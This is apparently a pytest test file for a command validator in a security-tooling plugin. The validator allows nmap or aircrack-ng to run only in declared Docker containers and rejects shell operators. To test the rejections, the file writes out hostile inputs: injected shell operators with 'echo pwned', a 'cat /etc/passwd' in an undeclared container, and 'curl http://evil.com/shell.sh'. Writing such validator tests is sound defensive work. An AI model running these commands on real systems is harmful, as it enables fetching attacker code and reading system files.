"""Tests for recipe command enforcement: shlex parsing, shell op rejection."""

import pytest


class TestShellOperatorRejection:
    @pytest.mark.parametrize("op", [";", "&&", "||", "|", ">", ">>", "<", "$(", "`"])
    def test_shell_operator_rejected(self, op):
        from opentools_plugin_core.enforcement import validate_command
        cmd = f"docker exec nmap-mcp nmap -sV target {op} echo pwned"
        violations = validate_command(cmd, allowed_containers={"nmap-mcp"})
        assert len(violations) >= 1
        assert any(v.severity == "red" for v in violations)

    def test_clean_command_accepted(self):
        from opentools_plugin_core.enforcement import validate_command
        cmd = "docker exec nmap-mcp nmap -sV --top-ports 1000 192.168.1.0/24"
        violations = validate_command(cmd, allowed_containers={"nmap-mcp"})
        assert violations == []


class TestContainerScoping:
    def test_undeclared_container_rejected(self):
        from opentools_plugin_core.enforcement import validate_command
        cmd = "docker exec evil-container cat /etc/passwd"
        violations = validate_command(cmd, allowed_containers={"nmap-mcp"})
        assert len(violations) >= 1
        assert any("evil-container" in v.message for v in violations)

    def test_declared_container_allowed(self):
        from opentools_plugin_core.enforcement import validate_command
        cmd = "docker exec aircrack-mcp aircrack-ng capture.cap"
        violations = validate_command(cmd, allowed_containers={"aircrack-mcp", "nmap-mcp"})
        assert violations == []

    def test_non_docker_exec_rejected(self):
        from opentools_plugin_core.enforcement import validate_command
        cmd = "curl http://evil.com/shell.sh"
        violations = validate_command(cmd, allowed_containers={"nmap-mcp"})
        assert len(violations) >= 1

    def test_docker_exec_with_flags(self):
        from opentools_plugin_core.enforcement import validate_command
        cmd = "docker exec -it nmap-mcp nmap -sV target"
        violations = validate_command(cmd, allowed_containers={"nmap-mcp"})
        assert violations == []


class TestExtractContainerName:
    def test_simple_extract(self):
        from opentools_plugin_core.enforcement import extract_container_name
        assert extract_container_name(["nmap-mcp", "nmap", "-sV"]) == "nmap-mcp"

    def test_extract_skips_flags(self):
        from opentools_plugin_core.enforcement import extract_container_name
        assert extract_container_name(["-it", "nmap-mcp", "cmd"]) == "nmap-mcp"

    def test_extract_skips_dash_e(self):
        from opentools_plugin_core.enforcement import extract_container_name
        assert extract_container_name(["-e", "FOO=bar", "nmap-mcp", "cmd"]) == "nmap-mcp"
